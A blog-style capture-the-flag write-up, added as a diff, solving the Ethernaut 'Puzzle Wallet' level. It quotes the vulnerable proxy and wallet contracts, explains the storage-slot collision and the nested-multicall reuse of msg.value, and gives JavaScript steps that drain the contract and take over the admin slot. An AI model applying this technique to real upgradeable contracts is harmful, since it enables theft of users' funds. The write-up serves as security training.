@@ -1,0 +1,279 @@
+---
+title: Ethernaut - Puzzle Wallet - Solution
+date: '2024-06-20'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Puzzle Wallet CTF
+---
+
+# Ethernaut - Puzzle Wallet - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+pragma experimental ABIEncoderV2;
+
+import "../helpers/UpgradeableProxy-08.sol";
+
+contract PuzzleProxy is UpgradeableProxy {
+    address public pendingAdmin;
+    address public admin;
+
+    constructor(address _admin, address _implementation, bytes memory _initData)
+        UpgradeableProxy(_implementation, _initData)
+    {
+        admin = _admin;
+    }
+
+    modifier onlyAdmin() {
+        require(msg.sender == admin, "Caller is not the admin");
+        _;
+    }
+
+    function proposeNewAdmin(address _newAdmin) external {
+        pendingAdmin = _newAdmin;
+    }
+
+    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
+        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
+        admin = pendingAdmin;
+    }
+
+    function upgradeTo(address _newImplementation) external onlyAdmin {
+        _upgradeTo(_newImplementation);
+    }
+}
+
+contract PuzzleWallet {
+    address public owner;
+    uint256 public maxBalance;
+    mapping(address => bool) public whitelisted;
+    mapping(address => uint256) public balances;
+
+    function init(uint256 _maxBalance) public {
+        require(maxBalance == 0, "Already initialized");
+        maxBalance = _maxBalance;
+        owner = msg.sender;
+    }
+
+    modifier onlyWhitelisted() {
+        require(whitelisted[msg.sender], "Not whitelisted");
+        _;
+    }
+
+    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
+        require(address(this).balance == 0, "Contract balance is not 0");
+        maxBalance = _maxBalance;
+    }
+
+    function addToWhitelist(address addr) external {
+        require(msg.sender == owner, "Not the owner");
+        whitelisted[addr] = true;
+    }
+
+    function deposit() external payable onlyWhitelisted {
+        require(address(this).balance <= maxBalance, "Max balance reached");
+        balances[msg.sender] += msg.value;
+    }
+
+    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
+        require(balances[msg.sender] >= value, "Insufficient balance");
+        balances[msg.sender] -= value;
+        (bool success,) = to.call{value: value}(data);
+        require(success, "Execution failed");
+    }
+
+    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
+        bool depositCalled = false;
+        for (uint256 i = 0; i < data.length; i++) {
+            bytes memory _data = data[i];
+            bytes4 selector;
+            assembly {
+                selector := mload(add(_data, 32))
+            }
+            if (selector == this.deposit.selector) {
+                require(!depositCalled, "Deposit can only be called once");
+                // Protect against reusing msg.value
+                depositCalled = true;
+            }
+            (bool success,) = address(this).delegatecall(data[i]);
+            require(success, "Error while delegating call");
+        }
+    }
+}
+```
+
+## Solution
+
+The goal of this challenge is to become the `admin` of `PuzzleProxy`.
+
+Recall that the storage slot arrangement in both proxy and implementation should be the same.
+However, this is not the case here!
+Instead, we have:
+
+| Slot | PuzzleProxy | PuzzleWallet |
+|------|-------------|--------------|
+|  0   | pendingAdmin| owner        |
+|  1   | admin       | maxBalance   |
+
+This tells us that, in order to become the `admin`, we need to find a way to write our address to slot 1, i.e., we either update `admin` directly or indirectly by writing a suitable value to `maxBalance`.
+
+Looking at our `PuzzleWallet` implementation, we see that it has two functions that can modify `maxBalance`:
+
+```solidity
+function init(uint256 _maxBalance) public {
+    require(maxBalance == 0, "Already initialized");
+    maxBalance = _maxBalance;
+    owner = msg.sender;
+}
+...
+function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
+    require(address(this).balance == 0, "Contract balance is not 0");
+    maxBalance = _maxBalance;
+}
+```
+
+We can see that `init()` requires `maxBalance` to be zero when the function is called.
+Hence, we won't be able to use it to modify `maxBalance` after the contract has been initialized with a non-zero value.
+
+`setMaxBalance()`, on the other hand, looks more promising as it's only checking if the contract's balance is zero.
+However, `setMaxBalance()` has an `onlyWhitelisted()` modifier applied to it, indicating that we first need to call the following function:
+
+```solidity
+function addToWhitelist(address addr) external {
+    require(msg.sender == owner, "Not the owner");
+    whitelisted[addr] = true;
+}
+```
+
+Again, we see that there is yet another check that prevents us from calling the function.
+In this case, we're required to be the `owner` in order to add an address to the whitelist.
+
+Looking at our storage slot table from earlier, we see that we can manipulate the `owner` either by writing directly to `owner` or by setting a new value for `pendingAdmin` as both share storage slot 0.
+The latter is easily achieved using the `proposeNewAdmin()` function, specifying our own address as the new `pendingAdmin`.
+
+Let's now take a closer look at the function that will allow us to drain the balance:
+
+```solidity
+function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
+    require(balances[msg.sender] >= value, "Insufficient balance");
+    balances[msg.sender] -= value;
+    (bool success,) = to.call{value: value}(data);
+    require(success, "Execution failed");
+}
+```
+
+This is the only function making a `call()` to an address `to` with some `value` sent with that call.
+However, it requires the balance of the caller to be at least the value sent. 
+
+So, to fulfill this requirement, we need to find a way to successfully pretend that we have more balance than we actually do.
+If we can achieve that, we can use `execute()` to drain the entire balance from the contract.
+
+Looking for a function we can use to manipulate our balance, we see that `deposit()` allows us to deposit an amount into the contract and adds this amount to our value in the `balances` mapping.
+However, if we just make a normal call to `deposit()`, it will add the amount in both the contract's and the `balances` mapping's bookkeeping.
+Recall, though, that we need to find a way to deposit our Ether only once, but increase the value in the `balances` mapping twice in order to successfully call `execute()`. 
+
+This is where `multicall()` comes in. 
+`multicall()` allows us to call a function multiple times in a single transaction.
+
+```solidity
+function multicall(bytes[] calldata data) external payable onlyWhitelisted {
+    bool depositCalled = false;
+    for (uint256 i = 0; i < data.length; i++) {
+        bytes memory _data = data[i];
+        bytes4 selector;
+        assembly {
+            selector := mload(add(_data, 32))
+        }
+        if (selector == this.deposit.selector) {
+            require(!depositCalled, "Deposit can only be called once");
+            // Protect against reusing msg.value
+            depositCalled = true;
+        }
+        (bool success,) = address(this).delegatecall(data[i]);
+        require(success, "Error while delegating call");
+    }
+}
+```
+
+The idea would be to call `deposit()` multiple times, supplying Ether only once. 
+However, there's yet another validation we need to worry about:
+`multicall()` is extracting `deposit()`'s function selector from the data passed to it and will change the `depositCalled` flag accordingly.
+
+To bypass this, we can call `multicall()` so that it calls multiple `multicall()`s with each of these `multicall()`s calling `deposit()` once.
+Note that `depoistCalled` won't get in the way here, since each `multicall()` will check their own `depositCalled` value.
+
+Starting out, the contract balance is 0.001 ETH.
+If we call `deposit()` two times through two `multicall()`s in the same transaction, then `balances[player]` is changed from 0 ETH to 0.002 ETH although only 0.001 ETH is actually sent.
+Therefore, the actual Ether balance of the contract is then 0.002 ETH, but the accounting in `balances` would report that it's 0.003 ETH.
+In any case, our player account is now eligible to take out 0.002 ETH from the contract and, hence, drain the wallet.
+
+Therefore, we can call `execute()` to drain the contract, subsequently call `setMaxBalance()` to override slot 1, thereby updating the value of the `admin`.
+
+All right!
+Now that we have a clear path forward, let's list to concrete steps that are necessary to solve this level.
+
+**Step 1**
+
+Become the `owner`.
+
+```javascript
+functionSignature = {
+    name: 'proposeNewAdmin',
+    type: 'function',
+    inputs: [
+        {
+            type: 'address',
+            name: '_newAdmin'
+        }
+    ]
+}
+
+params = [player]
+
+data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
+
+await web3.eth.sendTransaction({from: player, to: instance, data})
+```
+
+**Step 2**
+
+Whitelist your account.
+
+```javascript
+await contract.addToWhitelist(player)
+```
+
+**Step 3**
+
+Make a call to `multicall()` that will in turn call two `multicall()`s that each will in turn call `deposit()` once.
+Furthermore, ensure to send a value of 0.001 ETH with the transaction.
+
+```javascript
+// Get function call encodings
+// deposit() method
+depositData = await contract.methods["deposit()"].request().then(v => v.data)
+// multicall() method with param of deposit function call signature
+multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
+
+// Perform the actual call
+await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
+```
+
+**Step 4**
+
+Drain the 0.002 ETH from the contract.
+
+```javascript
+await contract.execute(player, toWei('0.002'), 0x0)
+```
+
+**Step 5**
+
+Lastly, set `admin` to `player`.
+
+```javascript
+await contract.setMaxBalance(player)
+```
